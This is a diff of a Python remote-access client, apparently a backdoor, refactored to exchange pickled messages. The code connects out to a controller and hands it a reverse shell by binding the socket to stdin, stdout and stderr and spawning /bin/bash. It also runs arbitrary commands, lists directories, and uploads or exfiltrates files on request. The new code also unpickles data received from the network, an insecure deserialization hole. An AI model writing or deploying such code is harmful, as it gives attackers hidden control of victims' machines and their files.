@@ -5,16 +5,13 @@ import argparse
 import logging
 import select
 import socket
+import pickle
 import json
 import time
 import pty
 import os
 
 logging.basicConfig(level=None)
-
-# Constants
-SEND_FILE_CMD = "put_file"
-GET_FILE_CMD = "get_file"
 
 def stat_to_dict(stat_obj):
     return {
@@ -50,7 +47,7 @@ def scandir_to_dict(path=None):
             entry_dict['stat'] = str(e)
         entries_list.append(entry_dict)
     entries_list = sorted(entries_list, key=lambda x: x['name'])
-    return json.dumps((entries_list)).encode()
+    return json.dumps((entries_list))
 
 class Shell:
     def __init__(self):
@@ -90,8 +87,8 @@ class NetManager:
                 continue
             break
         self.shell = Shell()
-        data = self.socket.recv(1024)
-        self.socket.sendall(self.execute_command(data))
+        data = pickle.loads(self.socket.recv(1024))
+        self.socket.sendall(self.execute_command(data).encode())
         self.crypto = ClientPyEncryption()
 
     def connect_to_host(self):
@@ -100,96 +97,91 @@ class NetManager:
         s.connect((self.host, self.port))
         return s
 
-    def receive_file(self, filename):
+    def receive_file(self, filename, data):
         """Receives a file from the socket and writes it to the local system."""
-        self.send_msg("ready".encode())
-        
-        try:
-            msg = self.recv_msg()
-        except ConnectionResetError:
-            return
-
-        with open(filename, "wb") as f:
-            f.write(msg)
+        with open(filename.split("/")[-1], "wb") as f:
+            f.write(data)
+        self.send_msg("")
 
     def send_file(self, filename):
         """Reads a file from the local system and sends it through the socket."""
         with open(filename, "rb") as f:
-            self.send_msg(f.read())
+            serialized = f.read()
 
-    def change_directory(self, cmd, folder):
+        self.send_msg(serialized)
+
+    def change_directory(self, folder):
         try:
             os.chdir(folder)
-            stdout_value = NO_OUTPUT_SIGNAL.encode()
+            stdout_value = NO_OUTPUT_SIGNAL
         except FileNotFoundError:
-            stdout_value = f"error: {folder} not found".encode()
+            stdout_value = f"error: {folder} not found"
         finally:
             self.send_msg(stdout_value)
 
     def handle_commands(self, data):
         """Add description"""
-        args = data.decode().split(" ")
-        if args[0] == "shell":
-            stdout_value = NO_OUTPUT_SIGNAL.encode()
-            self.send_msg(stdout_value)
-            # Save the old file descriptors
-            old_stdin = os.dup(0)
-            old_stdout = os.dup(1)
-            old_stderr = os.dup(2)
-            file_descriptor = self.socket.fileno()
-            # Duplicate the file descriptor for standard input, output, and error
-            os.dup2(file_descriptor, 0)  # Standard Input
-            os.dup2(file_descriptor, 1)  # Standard Output
-            os.dup2(file_descriptor, 2)  # Standard Error
+        command = data[0]
+        args = data[1:]
+        match command:
+            case "shell":
+                self.send_msg(NO_OUTPUT_SIGNAL)
+                # Save the old file descriptors
+                old_stdin = os.dup(0)
+                old_stdout = os.dup(1)
+                old_stderr = os.dup(2)
+                file_descriptor = self.socket.fileno()
+                # Duplicate the file descriptor for standard input, output, and error
+                os.dup2(file_descriptor, 0)  # Standard Input
+                os.dup2(file_descriptor, 1)  # Standard Output
+                os.dup2(file_descriptor, 2)  # Standard Error
 
-            # Spawn a new shell process
-            pty.spawn("/bin/bash")
-            # After the pty.spawn is done, restore the old file descriptors
-            self.socket.sendall(b"PotatoeMunchkinExit132@@")
-            self.socket.recv(1)
-            os.dup2(old_stdin, 0)
-            os.dup2(old_stdout, 1)
-            os.dup2(old_stderr, 2)
-            return True
-        elif args[0] == "ls":
-            if len(args) == 2:
-                self.send_msg(scandir_to_dict(args[1]))
-            elif len(args) == 1:
-                self.send_msg(scandir_to_dict())
-            return True
-        elif data.decode().split(" ")[0] == "cd":
-            cmd = data.decode().split(" ")[0]
-            folder = data.decode().split(" ")[1]
-            self.change_directory(cmd, folder)
-            return True
-        elif args[0] == SEND_FILE_CMD:
-            file = args[1].strip()
-            self.receive_file(file)
-            return True
-        elif args[0] == GET_FILE_CMD:
-            file = args[1].strip()
-            self.send_file(file)
-            return True
-        elif args[0] == "aliv":
-            self.send_response(b"is_alive")
-            return True
-        elif args[0] == "cmd":
-            self.send_msg(self.execute_command(data[4:]))
-            return True
+                # Spawn a new shell process
+                pty.spawn("/bin/bash")
+                # After the pty.spawn is done, restore the old file descriptors
+                self.socket.sendall(b"PotatoeMunchkinExit132@@")
+                self.socket.recv(1)
+                os.dup2(old_stdin, 0)
+                os.dup2(old_stdout, 1)
+                os.dup2(old_stderr, 2)
+                return True
+            case "ls":
+                filepath = args[0]
+                if filepath:
+                    self.send_msg(scandir_to_dict(filepath))
+                else:
+                    self.send_msg(scandir_to_dict())
+                return True
+            case "cd":
+                self.change_directory(args[0])
+                return True
+            case "put_file":
+                self.receive_file(args[0], args[1])
+                return True
+            case "get_file":
+                self.send_file(args[0])
+                return True
+            case "aliv":
+                self.send_response(b"is_alive")
+                return True
+            case "cmd":
+                self.send_msg(self.execute_command(args))
+                return True
         return False
 
     def execute_command(self, data):
         """Executes a command and sends the response back through the socket."""
-        stdout_value, stderr_value = self.shell.execute_command(data.decode("utf-8"))
-        return f"{stdout_value.decode()}{stderr_value.decode()}".encode()
+        result = subprocess.run(data, capture_output=True, text=True)
+        return f"{result.stdout}{result.stderr}"
 
     def send_msg(self, data):
+        data = pickle.dumps(data)
         if len(data) > 0:
             message_length, message = self.crypto.encrypt_message(data, self.crypto.derived_key)
             self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
             self.socket.sendall(message)
         else:
-            message_length, message = self.crypto.encrypt_message(NO_OUTPUT_SIGNAL.encode(), self.crypto.derived_key)
+            message_length, message = self.crypto.encrypt_message(NO_OUTPUT_SIGNAL, self.crypto.derived_key)
             self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
             self.socket.sendall(message)
 
@@ -213,7 +205,7 @@ class NetManager:
 
         while True:
             try:
-                msg = self.recv_msg()
+                msg = pickle.loads(self.recv_msg())
             except ConnectionResetError:
                 break
         
@@ -226,7 +218,7 @@ class NetManager:
                 logging.error("Connection closed by the host.")
                 break
             except Exception as e:
-                self.send_msg(str(e).encode())
+                self.send_msg(e)
 
 
 def main():
